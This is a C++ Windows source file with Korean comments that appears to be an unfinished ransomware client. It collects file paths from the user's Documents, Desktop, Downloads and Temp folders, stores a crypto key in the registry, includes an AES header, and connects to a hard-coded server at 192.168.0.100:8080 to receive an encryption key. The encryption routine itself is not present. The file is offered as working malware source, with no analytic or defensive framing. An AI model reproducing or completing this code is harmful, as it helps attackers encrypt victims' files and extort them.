#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <time.h>
#include <sys/types.h>
#include "aes.h"
using namespace std;

#define PORT 8080

#pragma comment(lib, "ws2_32.lib")

#define TARGET_NUM 4
#define FILE_MAXLEN 4096
#define BUFFER_SIZE 1024
#define KEY_LEN 8

#define PORT 8080

char rootFolderName[FILE_MAXLEN] = "C:\\Users\\";
char documentFolderName[FILE_MAXLEN];
char desktopFolderName[FILE_MAXLEN];
char downloadsFolderName[FILE_MAXLEN];
char tempFolderName[FILE_MAXLEN];

char* targetFolderList[TARGET_NUM];

char cryptoKey[KEY_LEN];

typedef struct TargetFolders {
	vector<string> documentFolderFiles;
	vector<string> desktopFolderFiles;
	vector<string> downloadsFolderFiles;
	vector<string> tempFolderFiles;
} TargetFolders;

TargetFolders targetFolders;

int notifyToServer();
void makeFolderPath();
int readTargetFolder(int, char*);
int registerKeyToRegistry();

int main(void)
{
	// 타겟 폴더 탐색에 필요한 경로 생성
	makeFolderPath();

	if (registerKeyToRegistry() == 0) {
		fprintf(stderr, "Register key error\n");
		return -1;
	}

	wprintf(L"key : %s\n", cryptoKey);

	WIN32_FIND_DATAA files;
	HANDLE curFile;

	// 타겟 폴더 탐색 후 폴더들 내 파일들을 폴더별로 구조체에 저장
	for (int i = 0; i < TARGET_NUM; i++) {
		if (readTargetFolder(i, targetFolderList[i]) == 0) {
			fprintf(stderr, "ReadTargetFolder Function error\n\n");
			return -1;
		}
	}

	WSADATA wsa;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		printf("error\n");
		return -1;
	}

	SOCKET client_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (client_sock == INVALID_SOCKET)
		return -1;

	struct sockaddr_in server_addr;
	memset(&server_addr, 0x0, sizeof(struct sockaddr_in));

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(PORT);

	server_addr.sin_addr.S_un.S_addr = inet_addr("192.168.0.100");

	if (connect(client_sock, (SOCKADDR*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
		WSACleanup();
		return -1;
	}

	printf("connect success\n");

	while (recv(client_sock, cryptoKey, sizeof(cryptoKey) - 1 , 0) != 0) {
		printf("recv success\n");
		printf("key : %s\n", cryptoKey);
	}

	printf("recv error\n");
	closesocket(client_sock);
	WSACleanup();
	return 0;
}

int notifyToServer()
{
	return 0;
}

void makeFolderPath()
{
	CHAR userName[FILE_MAXLEN] = { 0, };
	DWORD size = FILE_MAXLEN;
	GetUserNameA(userName, &size);
	printf("%s\n", userName);

	// root 경로 생성
	sprintf(rootFolderName, "%s%s", rootFolderName, userName);

	// document 경로 생성
	sprintf(documentFolderName, "%s\\%s", rootFolderName, "Documents\\*");

	// desktop 경로 생성
	sprintf(desktopFolderName, "%s\\%s", rootFolderName, "Desktop\\*");

	// downloads 경로 생성
	sprintf(downloadsFolderName, "%s\\%s", rootFolderName, "Downloads\\*");

	// temp 경로 생성
	sprintf(tempFolderName, "%s\\%s", rootFolderName, "AppData\\Local\\Temp\\*");

	targetFolderList[0] = documentFolderName;
	targetFolderList[1] = desktopFolderName;
	targetFolderList[2] = downloadsFolderName;
	targetFolderList[3] = tempFolderName;
}

int readTargetFolder(int i, char* targetFolderName)
{
	WIN32_FIND_DATAA files;
	HANDLE curFile;

	if ((curFile = FindFirstFileA(targetFolderName, &files)) == INVALID_HANDLE_VALUE) {
		printf("FindFirstFileA error\n");
		return 0;
	}

	while (FindNextFileA(curFile, &files)) {
		char obj[FILE_MAXLEN];
		memset(obj, 0x0, sizeof(obj));
		strcpy(obj, targetFolderName);
		obj[strlen(obj) - 1] = '\0';
		strcat(obj, files.cFileName);

		//printf("obj : %s\n", obj);

		if (files.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) {
			if (i == 0) {
				// document folder files
				targetFolders.documentFolderFiles.push_back(obj);
			}
			else if (i == 1) {
				// desktop folder files
				targetFolders.desktopFolderFiles.push_back(obj);
			}
			else if (i == 3) {
				// temp folder files
				targetFolders.tempFolderFiles.push_back(obj);
			}
			else if (i == 2) {
				// downloads folder files
				targetFolders.downloadsFolderFiles.push_back(obj);
			}
		}
		else
			continue;
	}

	FindClose(curFile);
	return 1;
}

int registerKeyToRegistry()
{
	HKEY hKey;
	LONG result;

	// 등록할 레지스트리 서브키(KEY)를 Envrionment 기본키 아래에 생성
	if (RegCreateKey(HKEY_CURRENT_USER, TEXT("Environment\\KEY"), &hKey) != ERROR_SUCCESS) {
		fprintf(stderr, "RegCreateKey error\n");
		return 0;
	}

	printf("create subkey success!\n");

	if (RegSetValueA(hKey, NULL, REG_SZ, cryptoKey, 0) != ERROR_SUCCESS) {
		fprintf(stderr, "RegSetValue error\n");
		return 0;
	}

	printf("set value success!\n");
	/*
	if (RegCreateKey(HKEY_CURRENT_USER, TEXT("KEY"), &hKey) != ERROR_SUCCESS) {
		fprintf(stderr, "RegCreateKey error\n");
		return 0;
	}

	printf("key register success\n");
	*/
	// 레지스트리 키 닫기
	RegCloseKey(hKey);
	return 1;
}
